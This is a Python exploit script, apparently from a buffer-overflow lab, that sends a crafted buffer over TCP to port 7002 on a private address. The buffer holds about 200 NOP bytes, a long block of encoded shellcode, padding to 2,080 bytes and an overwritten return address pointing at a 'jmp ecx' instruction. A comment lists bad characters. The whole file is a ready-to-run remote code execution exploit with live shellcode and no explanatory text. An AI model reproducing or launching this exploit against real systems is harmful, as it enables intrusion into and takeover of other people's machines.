import socket

print("\nSending evil buffer...")

eip = b"\x11\x2e\x80\x14" # 14802e11 jmp ecx
shellcode =  b"\x90"*200
shellcode += b"\xd9\xe1\xba\x2c\xf4\xbf\xcc\xd9\x74\x24\xf4"
shellcode += b"\x5d\x31\xc9\xb1\x52\x83\xed\xfc\x31\x55\x13"
shellcode += b"\x03\x79\xe7\x5d\x39\x7d\xef\x20\xc2\x7d\xf0"
shellcode += b"\x44\x4a\x98\xc1\x44\x28\xe9\x72\x75\x3a\xbf"
shellcode += b"\x7e\xfe\x6e\x2b\xf4\x72\xa7\x5c\xbd\x39\x91"
shellcode += b"\x53\x3e\x11\xe1\xf2\xbc\x68\x36\xd4\xfd\xa2"
shellcode += b"\x4b\x15\x39\xde\xa6\x47\x92\x94\x15\x77\x97"
shellcode += b"\xe1\xa5\xfc\xeb\xe4\xad\xe1\xbc\x07\x9f\xb4"
shellcode += b"\xb7\x51\x3f\x37\x1b\xea\x76\x2f\x78\xd7\xc1"
shellcode += b"\xc4\x4a\xa3\xd3\x0c\x83\x4c\x7f\x71\x2b\xbf"
shellcode += b"\x81\xb6\x8c\x20\xf4\xce\xee\xdd\x0f\x15\x8c"
shellcode += b"\x39\x85\x8d\x36\xc9\x3d\x69\xc6\x1e\xdb\xfa"
shellcode += b"\xc4\xeb\xaf\xa4\xc8\xea\x7c\xdf\xf5\x67\x83"
shellcode += b"\x0f\x7c\x33\xa0\x8b\x24\xe7\xc9\x8a\x80\x46"
shellcode += b"\xf5\xcc\x6a\x36\x53\x87\x87\x23\xee\xca\xcf"
shellcode += b"\x80\xc3\xf4\x0f\x8f\x54\x87\x3d\x10\xcf\x0f"
shellcode += b"\x0e\xd9\xc9\xc8\x71\xf0\xae\x46\x8c\xfb\xce"
shellcode += b"\x4f\x4b\xaf\x9e\xe7\x7a\xd0\x74\xf7\x83\x05"
shellcode += b"\xda\xa7\x2b\xf6\x9b\x17\x8c\xa6\x73\x7d\x03"
shellcode += b"\x98\x64\x7e\xc9\xb1\x0f\x85\x9a\x7d\x67\xa8"
shellcode += b"\xb7\x16\x7a\xb2\x46\x5c\xf3\x54\x22\xb2\x52"
shellcode += b"\xcf\xdb\x2b\xff\x9b\x7a\xb3\xd5\xe6\xbd\x3f"
shellcode += b"\xda\x17\x73\xc8\x97\x0b\xe4\x38\xe2\x71\xa3"
shellcode += b"\x47\xd8\x1d\x2f\xd5\x87\xdd\x26\xc6\x1f\x8a"
shellcode += b"\x6f\x38\x56\x5e\x82\x63\xc0\x7c\x5f\xf5\x2b"
shellcode += b"\xc4\x84\xc6\xb2\xc5\x49\x72\x91\xd5\x97\x7b"
shellcode += b"\x9d\x81\x47\x2a\x4b\x7f\x2e\x84\x3d\x29\xf8"
shellcode += b"\x7b\x94\xbd\x7d\xb0\x27\xbb\x81\x9d\xd1\x23"
shellcode += b"\x33\x48\xa4\x5c\xfc\x1c\x20\x25\xe0\xbc\xcf"
shellcode += b"\xfc\xa0\xdd\x2d\xd4\xdc\x75\xe8\xbd\x5c\x18"
shellcode += b"\x0b\x68\xa2\x25\x88\x98\x5b\xd2\x90\xe9\x5e"
shellcode += b"\x9e\x16\x02\x13\x8f\xf2\x24\x80\xb0\xd6"
# badchars: 3b, 45
buffer = shellcode + b'A'*(2080 - len(shellcode))+ eip

s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
s.connect(("192.168.173.10", 7002))
s.send(buffer)
s.close()

print("\nDone!")